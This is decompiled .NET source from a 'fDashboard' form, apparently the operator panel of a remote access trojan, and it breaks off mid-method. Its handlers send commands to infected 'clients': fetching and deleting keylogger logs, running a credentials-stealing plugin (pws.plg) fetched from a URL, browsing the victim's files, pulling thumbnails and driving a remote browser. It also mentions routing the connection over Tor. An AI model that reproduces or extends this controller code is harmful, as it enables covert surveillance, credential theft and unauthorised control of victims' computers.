	// Token: 0x060008DE RID: 2270 RVA: 0x000068D9 File Offset: 0x00004AD9
	private void method_128(object sender, MouseEventArgs e)
	{
		this.vmethod_12().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_552().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x060008DF RID: 2271 RVA: 0x0004896C File Offset: 0x00046B6C
	private void method_129(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		GClass7 gclass = this.vmethod_720();
		checked
		{
			int num = gclass.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(gclass.Items[i].Text);
				int num2 = gclass.Columns.Count - 1;
				for (int j = 1; j <= num2; j++)
				{
					stringBuilder.Append("\t" + gclass.Items[i].SubItems[j].Text);
				}
				stringBuilder.Append("\r\n");
			}
			if (stringBuilder.Length > 0)
			{
				string text = stringBuilder.ToString();
				Clipboard.Clear();
				Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
			}
		}
	}

	// Token: 0x060008E0 RID: 2272 RVA: 0x00048A3C File Offset: 0x00046C3C
	private void method_130(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		GClass7 gclass = this.vmethod_720();
		checked
		{
			if (gclass.SelectedItems.Count > 0)
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						stringBuilder.Append(gclass.Items[i].Text);
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							stringBuilder.Append("\t" + gclass.Items[i].SubItems[j].Text);
						}
						stringBuilder.Append("\r\n");
					}
				}
			}
			if (stringBuilder.Length > 0)
			{
				string text = stringBuilder.ToString();
				Clipboard.Clear();
				Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
			}
		}
	}

	// Token: 0x060008E1 RID: 2273 RVA: 0x00048B34 File Offset: 0x00046D34
	private void method_131(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		GClass7 gclass = this.vmethod_388();
		checked
		{
			if (gclass.SelectedItems.Count == 1)
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						stringBuilder.Append(Operators.ConcatenateObject(gclass.Items[i].Tag, "|"));
					}
				}
			}
			else if (gclass.SelectedItems.Count > 1 && MessageBox.Show("You have selected " + Conversions.ToString(this.vmethod_388().SelectedItems.Count) + " logs.\r\nLogs will be displayed as a single/combined log. Proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				int num2 = gclass.Items.Count - 1;
				for (int j = 0; j <= num2; j++)
				{
					if (gclass.Items[j].Selected)
					{
						stringBuilder.Append(Operators.ConcatenateObject(gclass.Items[j].Tag, "|"));
					}
				}
			}
			this.vmethod_556().Visible = true;
			this.vmethod_556().BringToFront();
			this.vmethod_280().Clear();
			this.vmethod_280().Enabled = false;
			this.vmethod_388().Enabled = false;
			this.vmethod_712().Enabled = false;
			this.vmethod_702().Enabled = false;
			this.vmethod_704().Enabled = false;
			this.vmethod_280().Clear();
			this.vmethod_280().Enabled = false;
			string text = this.string_4;
			string text2 = "klgoff_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString()));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008E2 RID: 2274 RVA: 0x00048D5C File Offset: 0x00046F5C
	private void method_132(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_718().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060008E3 RID: 2275 RVA: 0x00048DC8 File Offset: 0x00046FC8
	private void method_133(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_78().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060008E4 RID: 2276 RVA: 0x00048E34 File Offset: 0x00047034
	private void method_134(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_720().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060008E5 RID: 2277 RVA: 0x00048EA0 File Offset: 0x000470A0
	private void method_135(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		GClass7 gclass = this.vmethod_388();
		checked
		{
			if (gclass.SelectedItems.Count == 1)
			{
				if (MessageBox.Show("Permanently delete selected log?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
				{
					return;
				}
				stringBuilder.Append(Operators.ConcatenateObject(gclass.SelectedItems[0].Tag, "|"));
			}
			else if (gclass.SelectedItems.Count > 1)
			{
				if (MessageBox.Show("You have selected " + Conversions.ToString(this.vmethod_388().SelectedItems.Count) + " logs.\r\nLogs will be permanently deleted. Proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
				{
					return;
				}
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						stringBuilder.Append(Operators.ConcatenateObject(gclass.Items[i].Tag, "|"));
					}
				}
			}
			this.vmethod_556().Visible = true;
			this.vmethod_556().BringToFront();
			this.vmethod_280().Clear();
			this.vmethod_280().Enabled = false;
			this.vmethod_388().Enabled = false;
			this.vmethod_712().Enabled = false;
			this.vmethod_702().Enabled = false;
			this.vmethod_704().Enabled = false;
			this.vmethod_280().Clear();
			this.vmethod_280().Enabled = false;
			string text = this.string_4;
			string text2 = "klgoff_del|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString()));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008E6 RID: 2278 RVA: 0x0000690F File Offset: 0x00004B0F
	private void method_136(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 10;
		this.method_41();
	}

	// Token: 0x060008E7 RID: 2279 RVA: 0x000490B4 File Offset: 0x000472B4
	private void method_137(object sender, EventArgs e)
	{
		if (!File.Exists(Application.StartupPath + "\\data\\plugins\\pws.plg"))
		{
			Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + "\\data\\plugins\\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
		string str = Class136.smethod_29(ref text);
		checked
		{
			string text3;
			string text4;
			Class136.Class138 @class;
			if (!Class135.smethod_0().PluginsUpload)
			{
				if (Class135.smethod_0().PluginsURLPws.Length < 8 | !Class135.smethod_0().PluginsURLPws.Contains("://") | !Class135.smethod_0().PluginsURLPws.Contains("http") | !Class135.smethod_0().PluginsURLPws.Contains(".") | Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0)
				{
					Interaction.MsgBox("URL to Credentials plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
					Class130.fSettings_0.Visible = true;
					Form fSettings_ = Class130.fSettings_0;
					bool flag = false;
					Form form = fSettings_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fSettings_0.Activate();
					Class130.fSettings_0.vmethod_6().SelectedIndex = 3;
					Class130.fSettings_0.vmethod_44().Select();
					Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
					return;
				}
				string text2 = this.string_4;
				text3 = "crd_logins|" + str + "|" + Class135.smethod_0().PluginsURLPws;
				text4 = text2;
				@class = new Class136.Class138();
				@class.string_0 = text4;
				@class.string_1 = text3;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					goto IL_2B2;
				}
				catch (Exception ex)
				{
					goto IL_2B2;
				}
			}
			string text5 = this.string_4;
			text3 = "crd_logins_req|" + str;
			text4 = text5;
			@class = new Class136.Class138();
			@class.string_0 = text4;
			@class.string_1 = text3;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex2)
			{
			}
			IL_2B2:
			this.vmethod_418().Enabled = false;
		}
	}

	// Token: 0x060008E8 RID: 2280 RVA: 0x0004939C File Offset: 0x0004759C
	private void method_138(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_76().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060008E9 RID: 2281 RVA: 0x00049408 File Offset: 0x00047608
	private void method_139(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_418().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_418();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					text += gclass.Items[i].Text;
					int num2 = gclass.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						text = text + "\t" + gclass.Items[i].SubItems[j].Text;
					}
					text += "\r\n";
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x060008EA RID: 2282 RVA: 0x000494E8 File Offset: 0x000476E8
	private void method_140(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_418().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_418();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text += gclass.Items[i].Text;
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							text = text + "\t" + gclass.Items[i].SubItems[j].Text;
						}
						text += "\r\n";
					}
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x060008EB RID: 2283 RVA: 0x000495E0 File Offset: 0x000477E0
	private void method_141(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text += gclass.Items[i].Text;
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							text = text + "\t" + gclass.Items[i].SubItems[j].Text;
						}
						text += "\r\n";
					}
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x060008EC RID: 2284 RVA: 0x000496D8 File Offset: 0x000478D8
	private void method_142(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					text += gclass.Items[i].Text;
					int num2 = gclass.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						text = text + "\t" + gclass.Items[i].SubItems[j].Text;
					}
					text += "\r\n";
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x060008ED RID: 2285 RVA: 0x00006924 File Offset: 0x00004B24
	private void method_143(object sender, MouseEventArgs e)
	{
		this.vmethod_390().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_388().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x060008EE RID: 2286 RVA: 0x000497B8 File Offset: 0x000479B8
	private void method_144(object sender, EventArgs e)
	{
		if (this.collection_1.Count > 0)
		{
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			this.vmethod_450().Enabled = false;
			this.vmethod_696().Enabled = false;
			this.vmethod_452().Enabled = false;
			this.vmethod_454().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			this.string_8 = Conversions.ToString(this.collection_1[this.collection_1.Count]);
			this.collection_1.Remove(this.collection_1.Count);
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008EF RID: 2287 RVA: 0x00049944 File Offset: 0x00047B44
	private void method_145(object sender, EventArgs e)
	{
		if (this.string_8.Length >= 3)
		{
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			this.vmethod_450().Enabled = false;
			this.vmethod_696().Enabled = false;
			this.vmethod_452().Enabled = false;
			this.vmethod_454().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			this.vmethod_720().BackColor = Color.White;
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(Directory.GetDirectoryRoot(this.string_8))) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008F0 RID: 2288 RVA: 0x00040534 File Offset: 0x0003E734
	private void method_146(object sender, EventArgs e)
	{
		if (this.string_8.Length >= 3)
		{
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			this.vmethod_450().Enabled = false;
			this.vmethod_696().Enabled = false;
			this.vmethod_452().Enabled = false;
			this.vmethod_454().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008F1 RID: 2289 RVA: 0x0000695A File Offset: 0x00004B5A
	public void method_147()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fDashboard.Delegate29(this.method_147), new object[0]);
			return;
		}
		base.Visible = true;
		this.vmethod_560().RunWorkerAsync();
	}

	// Token: 0x060008F2 RID: 2290 RVA: 0x00006990 File Offset: 0x00004B90
	public void method_148()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fDashboard.Delegate33(this.method_148), new object[0]);
			return;
		}
		this.int_0 = 0;
		base.Opacity = (double)this.int_0;
		base.Visible = false;
	}

	// Token: 0x060008F3 RID: 2291 RVA: 0x00049AB0 File Offset: 0x00047CB0
	private void method_149(object sender, EventArgs e)
	{
		if (this.string_8.Length > 3)
		{
			this.collection_1.Add(this.string_8, null, null, null);
			this.vmethod_446().Enabled = false;
			this.string_8 = Class136.smethod_21(ref this.string_8);
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			this.vmethod_450().Enabled = false;
			this.vmethod_696().Enabled = false;
			this.vmethod_452().Enabled = false;
			this.vmethod_454().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008F4 RID: 2292 RVA: 0x00049C38 File Offset: 0x00047E38
	private void method_150(object sender, EventArgs e)
	{
		if (this.vmethod_454().Items.Count > 0)
		{
			this.collection_1.Clear();
			this.vmethod_696().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			fDashboard.Class127 @class = (fDashboard.Class127)this.vmethod_454().SelectedItem;
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(Strings.Split(@class.method_0(), " ", 4, CompareMethod.Text)[2])) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 class2 = new Class136.Class138();
			class2.string_0 = text3;
			class2.string_1 = text2;
			class2.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
				{
					new Thread(new ThreadStart(class2._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008F5 RID: 2293 RVA: 0x00049D88 File Offset: 0x00047F88
	private void method_151(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_388().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060008F6 RID: 2294 RVA: 0x00049DF4 File Offset: 0x00047FF4
	private void method_152(object sender, EventArgs e)
	{
		if (this.vmethod_388().SelectedItems.Count > 0)
		{
			this.vmethod_556().BringToFront();
			this.vmethod_556().Visible = true;
			this.vmethod_280().Clear();
			this.vmethod_280().Enabled = false;
			this.vmethod_388().Enabled = false;
			this.vmethod_712().Enabled = false;
			this.vmethod_702().Enabled = false;
			this.vmethod_704().Enabled = false;
			string text = this.string_4;
			string str = "klgoff_get|";
			ListViewItem listViewItem;
			object[] array;
			bool[] array2;
			object obj = NewLateBinding.LateGet(Encoding.UTF8, null, "GetBytes", array = new object[]
			{
				(listViewItem = this.vmethod_388().SelectedItems[0]).Tag
			}, null, null, array2 = new bool[]
			{
				true
			});
			if (array2[0])
			{
				listViewItem.Tag = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
			}
			string text2 = str + Convert.ToBase64String((byte[])obj);
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008F7 RID: 2295 RVA: 0x00049F60 File Offset: 0x00048160
	private void method_153(object sender, EventArgs e)
	{
		if (!Class130.concurrentDictionary_3.ContainsKey(this.string_4))
		{
			Interaction.MsgBox("No information available. Reason: You are not connected to the client!", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		if (Class130.concurrentDictionary_3[this.string_4].IS_SSL)
		{
			Interaction.MsgBox(string.Concat(new string[]
			{
				"This connection is encrypted using the following parameters: \r\nCipher: ",
				Class130.concurrentDictionary_3[this.string_4].SSL_CIPHER,
				"\r\nHash: ",
				Class130.concurrentDictionary_3[this.string_4].SSL_HASH,
				"\r\nKey exchange: ",
				Class130.concurrentDictionary_3[this.string_4].SSL_KEYEXCHANGE,
				"\r\nProtocol: ",
				Class130.concurrentDictionary_3[this.string_4].SSL_PROTOCOL,
				"\r\nCipher suite: ",
				Class130.concurrentDictionary_3[this.string_4].SSL_CIPHERSUITE
			}), MsgBoxStyle.Information, Application.ProductName);
			return;
		}
		Interaction.MsgBox("This connection is rerouted via the Tor network.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x060008F8 RID: 2296 RVA: 0x000069CF File Offset: 0x00004BCF
	private void method_154(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 11;
		this.method_41();
	}

	// Token: 0x060008F9 RID: 2297 RVA: 0x0004A07C File Offset: 0x0004827C
	private void method_155(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_418().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060008FA RID: 2298 RVA: 0x0004A0E8 File Offset: 0x000482E8
	private void method_156(object sender, EventArgs e)
	{
		this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_720().SelectedItems.Count);
		if (this.fThumb_0 != null && this.fThumb_0.Visible)
		{
			GClass7 gclass = this.vmethod_720();
			if (gclass.SelectedItems.Count > 0 && Class136.smethod_5(gclass.SelectedItems[0].Text))
			{
				this.fThumb_0.method_0(gclass.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
				string text = this.string_4;
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", gclass.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				this.fThumb_0.method_1();
			}
		}
	}

	// Token: 0x060008FB RID: 2299 RVA: 0x0004A284 File Offset: 0x00048484
	private void method_157(object sender, DrawItemEventArgs e)
	{
		checked
		{
			if (e.Index > -1)
			{
				fDashboard.Class127 @class = (fDashboard.Class127)this.vmethod_454().Items[e.Index];
				e.DrawBackground();
				e.Graphics.DrawImage(@class.method_2(), e.Bounds.Left + 5, e.Bounds.Top);
				e.Graphics.DrawString(@class.method_0(), new Font(this.Font, FontStyle.Regular), Brushes.Black, (float)(@class.method_2().Width + 10), (float)e.Bounds.Top, StringFormat.GenericDefault);
			}
		}
	}

	// Token: 0x060008FC RID: 2300 RVA: 0x0004A334 File Offset: 0x00048534
	private void method_158(object sender, MeasureItemEventArgs e)
	{
		e.ItemHeight = this.imageList_1.ImageSize.Height;
		e.ItemWidth = this.imageList_1.ImageSize.Width;
	}

	// Token: 0x060008FD RID: 2301 RVA: 0x0004A374 File Offset: 0x00048574
	private void method_159(object sender, MouseEventArgs e)
	{
		if (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0)
		{
			if (e.Button == MouseButtons.Left)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"remotebrowser_click|",
					Conversions.ToString(513),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
			if (e.Button == MouseButtons.Right)
			{
				string text4 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"remotebrowser_click|",
					Conversions.ToString(516),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y)
				});
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			if (e.Button == MouseButtons.Middle)
			{
				string text5 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"remotebrowser_click|",
					Conversions.ToString(519),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y)
				});
				string text3 = text5;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}
	}

	// Token: 0x060008FE RID: 2302 RVA: 0x000069E4 File Offset: 0x00004BE4
	private void method_160(object sender, MouseEventArgs e)
	{
		Operators.CompareString(this.vmethod_708().Text, "Stop", true);
	}

	// Token: 0x060008FF RID: 2303 RVA: 0x0004A6EC File Offset: 0x000488EC
	private void method_161(object sender, EventArgs e)
	{
		checked
		{
			if (Class130.concurrentDictionary_3[this.string_4].fSrch == null)
			{
				Class130.concurrentDictionary_3[this.string_4].fSrch = new fSearch();
				Class130.concurrentDictionary_3[this.string_4].fSrch.method_7(this.string_0, this.string_2, this.string_1, this.string_3, this.string_8, this.string_4);
				Class130.concurrentDictionary_3[this.string_4].fSrch.Opacity = 0.0;
				Class130.concurrentDictionary_3[this.string_4].fSrch.Activate();
				Class130.concurrentDictionary_3[this.string_4].fSrch.Show();
				Form fSrch = Class130.concurrentDictionary_3[this.string_4].fSrch;
				bool flag = false;
				Form form = fSrch;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				return;
			}
			if (!Class130.concurrentDictionary_3[this.string_4].fSrch.Visible)
			{
				Form fSrch2 = Class130.concurrentDictionary_3[this.string_4].fSrch;
				bool flag = false;
				Form form = fSrch2;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
